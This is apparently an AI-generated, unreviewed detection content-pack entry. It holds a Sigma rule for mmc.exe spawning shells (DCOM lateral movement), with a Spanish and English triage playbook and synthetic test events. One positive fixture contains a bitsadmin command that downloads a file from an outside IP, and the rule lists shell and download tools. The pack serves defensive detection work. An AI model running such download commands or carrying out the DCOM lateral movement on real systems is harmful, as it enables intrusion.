@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "05a2ab7e-ce11-4b63-86db-ab32e763e11d",
+    "title": "MMC Spawning Windows Shell",
+    "level": "high",
+    "status": "test",
+    "author": "Karneades, Swisscom CSIRT",
+    "path": "windows/process_creation/proc_creation_win_mmc_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mmc_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1021.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "El proceso mmc.exe inició un intérprete de comandos o una utilidad del sistema (cmd, PowerShell, wscript, reg, regsvr32, bitsadmin, etc.). Esto puede indicar movimiento lateral mediante el objeto COM MMC20.Application o el abuso de un snap-in malicioso.",
+      "what_it_detects": "Eventos de creación de procesos en los que ParentImage termina en \\mmc.exe e Image es cmd.exe, powershell.exe, pwsh.exe, wscript.exe, cscript.exe, sh.exe, bash.exe, reg.exe, regsvr32.exe o contiene \\BITSADMIN.",
+      "why_it_matters": "Un atacante con credenciales puede instanciar MMC20.Application por DCOM en un host remoto y ejecutar comandos con ExecuteShellCommand (T1021.003, Distributed Component Object Model). Así logra movimiento lateral sin usar servicios ni PsExec.",
+      "triage_steps": [
+        "Revise CommandLine del proceso hijo: busque payloads codificados, descargas, rutas temporales, creación de usuarios o cambios en el registro.",
+        "Revise la línea de comandos de mmc.exe: '-Embedding' indica activación COM/DCOM; un archivo .msc fuera de System32 sugiere un snap-in malicioso.",
+        "Identifique al usuario y la sesión. Correlacione con logons de tipo 3 (4624) y tráfico RPC/DCOM (135 y puertos dinámicos) en el mismo host +/- 15 minutos.",
+        "Determine la IP de origen del logon de red y revise qué hizo esa máquina antes y después del evento.",
+        "Enumere los procesos hijos y nietos del intérprete: conexiones de red, archivos escritos, tareas programadas o servicios creados.",
+        "Busque alertas previas del mismo usuario, host o IP de origen, y ejecuciones similares de mmc.exe en otros endpoints."
+      ],
+      "false_positives": [
+        "Administradores que abren una consola desde un snap-in de MMC (por ejemplo, herramientas personalizadas que lanzan cmd o PowerShell).",
+        "Snap-ins de terceros o internos que ejecutan scripts o reg.exe como parte de su funcionamiento.",
+        "Herramientas de administración remota legítimas que usan MMC20.Application por DCOM, que deben estar documentadas."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el equipo de TI si la actividad estaba autorizada y si coincide con una ventana de cambios.",
+        "Si no está autorizada, aísle el endpoint y el host de origen, y deshabilite o restablezca la cuenta usada.",
+        "Elimine los artefactos de persistencia identificados (tareas, servicios, claves Run, archivos .msc maliciosos) después de preservar la evidencia.",
+        "Restrinja DCOM remoto mediante firewall y limite los permisos de lanzamiento de MMC20.Application; supervise si hay reincidencia."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque mmc.exe rara vez lanza intérpretes en el uso normal y el patrón coincide con una técnica conocida de movimiento lateral por DCOM."
+    },
+    "en": {
+      "summary": "mmc.exe started a shell or system utility (cmd, PowerShell, wscript, reg, regsvr32, bitsadmin, etc.). This may indicate lateral movement via the MMC20.Application COM object or a malicious snap-in.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\mmc.exe and Image is cmd.exe, powershell.exe, pwsh.exe, wscript.exe, cscript.exe, sh.exe, bash.exe, reg.exe, regsvr32.exe or contains \\BITSADMIN.",
+      "why_it_matters": "An attacker with credentials can instantiate MMC20.Application over DCOM on a remote host and run commands through ExecuteShellCommand (T1021.003, Distributed Component Object Model), moving laterally without services or PsExec.",
+      "triage_steps": [
+        "Review the child's CommandLine for encoded payloads, downloads, temp paths, user creation or registry changes.",
+        "Check mmc.exe's command line: '-Embedding' indicates COM/DCOM activation; a .msc file outside System32 suggests a malicious snap-in.",
+        "Identify the user and session. Correlate with type 3 logons (4624) and RPC/DCOM traffic (135 and dynamic ports) on the host within +/- 15 minutes.",
+        "Find the source IP of the network logon and review that machine's activity before and after.",
+        "Walk the child and grandchild process tree: network connections, written files, scheduled tasks or services created.",
+        "Search earlier alerts for the same user, host or source IP, and similar mmc.exe executions on other endpoints."
+      ],
+      "false_positives": [
+        "Administrators launching a console from an MMC snap-in, such as custom tools that open cmd or PowerShell.",
+        "Third-party or in-house snap-ins that run scripts or reg.exe as part of normal operation.",
+        "Legitimate remote administration tooling using MMC20.Application over DCOM; this should be documented."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the activity was authorized and matches a change window.",
+        "If unauthorized, isolate the endpoint and the source host, and disable or reset the account used.",
+        "Remove identified persistence (tasks, services, Run keys, malicious .msc files) after preserving evidence.",
+        "Restrict remote DCOM with firewall rules and limit MMC20.Application launch permissions; monitor for recurrence."
+      ],
+      "severity_rationale": "High fits because mmc.exe rarely spawns shells in normal use and the pattern matches a known DCOM lateral movement technique."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "MMC activated via DCOM (-Embedding) spawns cmd.exe running a command, typical of MMC20.Application ExecuteShellCommand",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\mmc.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c whoami > C:\\Windows\\Temp\\out.txt",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "MMC spawns bitsadmin to download a file (matches Image contains \\BITSADMIN case-insensitively)",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE-02.andes.example.com",
+          "User": "ANDES\\adm-lgomez",
+          "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\mmc.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "CommandLine": "bitsadmin /transfer job1 http://198.51.100.20/update.bin C:\\Users\\Public\\update.bin",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "MMC launches a legitimate snap-in helper (eventvwr) rather than a shell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\mmc.exe",
+          "ParentCommandLine": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\compmgmt.msc\"",
+          "Image": "C:\\Windows\\System32\\eventvwr.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\eventvwr.exe\"",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "cmd.exe started by explorer.exe, not by mmc.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
